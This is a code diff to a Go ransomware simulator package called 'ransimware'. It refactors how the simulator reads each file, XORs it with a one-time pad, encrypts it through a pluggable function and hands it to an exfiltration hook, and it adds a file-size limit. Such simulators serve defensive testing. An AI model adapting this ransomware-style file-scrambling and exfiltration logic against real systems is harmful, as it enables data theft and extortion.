@@ -3,7 +3,7 @@ package ransimware
 import (
 	"crypto/rand"
 	"fmt"
-	"io"
+	"io/ioutil"
 	"os"
 	"path/filepath"
 
@@ -16,7 +16,7 @@ type Simulator struct {
 	Encrypt func(fn string, b []byte) ([]byte, error)
 	Exfil   func(fn string, b []byte) error
 	Notify  func() error
-	otp     [32]byte
+	OTP     [32]byte
 	paths   []string
 	Threads int
 }
@@ -31,11 +31,11 @@ func New(threads int) *Simulator {
 		Threads: threads,
 	}
 
-	if _, e = rand.Read(s.otp[:]); e != nil {
+	if _, e = rand.Read(s.OTP[:]); e != nil {
 		// Fallback to hard-coded incrementing bytes
-		s.otp[0] = 0x41
+		s.OTP[0] = 0x41
 		for i := 1; i < 32; i++ {
-			s.otp[i] = s.otp[i-1] + 1
+			s.OTP[i] = s.OTP[i-1] + 1
 		}
 	}
 
@@ -43,10 +43,9 @@ func New(threads int) *Simulator {
 }
 
 func (s *Simulator) processFile(tid int, data tp.ThreadData) {
-	var contents []byte = make([]byte, ReadSize)
+	var contents []byte
 	var e error
 	var f *os.File
-	var n int
 	var path string = data["path"].(string)
 	var tmp []byte
 
@@ -56,30 +55,29 @@ func (s *Simulator) processFile(tid int, data tp.ThreadData) {
 	}
 	defer f.Close()
 
-	// Stream file
-	for {
-		// Read file
-		if n, e = f.Read(contents[:]); (n == 0) && (e == io.EOF) {
-			f.Close()
-		} else if e != nil {
-			return
-		}
+	// Read file
+	if contents, e = ioutil.ReadAll(f); e != nil {
+		fmt.Println(e.Error())
+		return
+	}
 
-		// Turn file contents into garbage
-		for i := 0; i < n; i++ {
-			contents[i] ^= s.otp[i%32]
-		}
+	// Close file
+	f.Close()
 
-		// Encrypt contents
-		if tmp, e = s.Encrypt(path, contents[:n]); e != nil {
-			fmt.Println(e.Error())
-			tmp = contents[:n]
-		}
+	// Turn file contents into garbage
+	for i := range contents {
+		contents[i] ^= s.OTP[i%32]
+	}
 
-		// Exfil
-		if e = s.Exfil(path, tmp); e != nil {
-			fmt.Println(e.Error())
-		}
+	// Encrypt contents
+	if tmp, e = s.Encrypt(path, contents); e != nil {
+		fmt.Println(e.Error())
+		tmp = contents
+	}
+
+	// Exfil
+	if e = s.Exfil(path, tmp); e != nil {
+		fmt.Println(e.Error())
 	}
 }
 
@@ -118,6 +116,11 @@ func (s *Simulator) Run() error {
 
 				// Ignore directories
 				if info.IsDir() {
+					return nil
+				}
+
+				// Ignore files larger than MaxSize
+				if info.Size() > MaxSize {
 					return nil
 				}
 
